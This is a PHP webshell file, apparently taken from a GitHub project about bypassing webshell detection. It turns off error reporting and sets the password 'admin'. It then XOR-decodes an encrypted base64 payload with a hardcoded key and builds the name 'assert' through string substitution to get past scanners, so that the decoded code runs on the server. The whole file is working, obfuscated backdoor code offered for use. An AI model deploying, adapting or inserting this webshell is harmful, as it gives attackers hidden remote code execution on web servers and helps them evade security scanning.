<!--github:https://github.com/Ringo233/Copy-bypass-webshell--->
<?php
error_reporting(0);
$password='admin';
function decodex($endata,$key)
{
	$dedata = base64_decode($endata);
	for($i=0;$i<strlen($dedata);$i++) {
    	$dedata[$i] = $dedata[$i]^$key[$i+1&31]; 
    }
	return $dedata;
}
$key = '751d31dd6b56b26b29dac2c0e1839e34';
$endata = "UEcFXxkGBUUHAwI9VlMBXV0BSUF2Ml8rclFhUDVgfl1UeS1aflcqWgEGeBJQBFdUWlczC1ENYQp6bEB3Jl5YWn52MkdSLDYDKXZkBGcGNGZsVA0zZg9DC2R/W040AQ1cb2IAV3o3CAEocmdbeHErXXQwIFN5MAQOaFFUQShnbUd5WDZaeiAhTixcXRd4cStddDAkGnkwBA5oUVQIKnBfQn92LVx/IAdGLlxkC3lyMwFyN1UIawpXHXx8ZkkpWmZefnUhRH43D0Mocn8Nf2IjSHI3VQhrCldVf2tYTC90fVh4ZSFLejdQXTtcURp/YjdCdQ0zCnkndRx8e1hML3R9WHt1PUN9DTZfKXFdV3llVllgDQYbfzd1FX1RYVAud3FAemIPRnsjLVkscVUSfl8wW3IgJBR8MFsQe396VihndQJ+YlBYaA0DAyxMXRd4cStddDAgGXkwBA5oUVRBKHdxR3lYNlp6ICFOLGZdF3hxK113IAITfgpiDHp8dk4rYF9Cf3YtXH4wD0YuXGQLeXInSnQ3ChZ4JHkKf3xYSSlaZl5+dTEAejdQXTtcUVJ8XwlHcyMoDH83cR96awdSPFpTT3h1MUN9DTZfKXFzFX9fCQVzIzRaeCR5CnxsckAuYABcbFgDS3wgMUYuXGQLeXInRXYnChZ4JHkKfGxyQS5gAFxsWAMGfzcPAShyYxdiZTBbciAkFH8aWxB7f3pWKGd1T35iUFhoDQNOL2FvEn5fMFtyIApSeTAEDmhRVAwqYF8Af3YxRmE3Nl8pcXMaf2UJR3MjKAx/N3USemsHUjxaU094ZT1DfQ02XylxcxV/ZQlHcyMoDH83dRJ6bEBSP2AADn92LVx8MCEEKWYCCWtfBUp0MDQTfRpiA2QIZW0wA1hnYV0XXWQjDEEzBw8JaGUGVmk3Mw95IGIOemxHAC90bQ5/di1cfDAlTClmAglrXwVKdA4oE34KYgx6fHZOK2BfQn92LVx8MCFBKWFFCWhfVgtzIygMfzdxHHprB1I8WlNPeHUDQ30NNl8pcV1ReWVWWWANBht/N2kVfVFhUC53cUB4Yg8EYCMyBDtiQQ14cTtdcyJYN2A1fjFibQp2MkpQZlR5JndTVjZaKAQGEnliEXx6A1EoEEoZ";
$dedata = decodex($endata,$key);
$payload = substr_replace('assexx','rt', 4);
$payload($dedata);
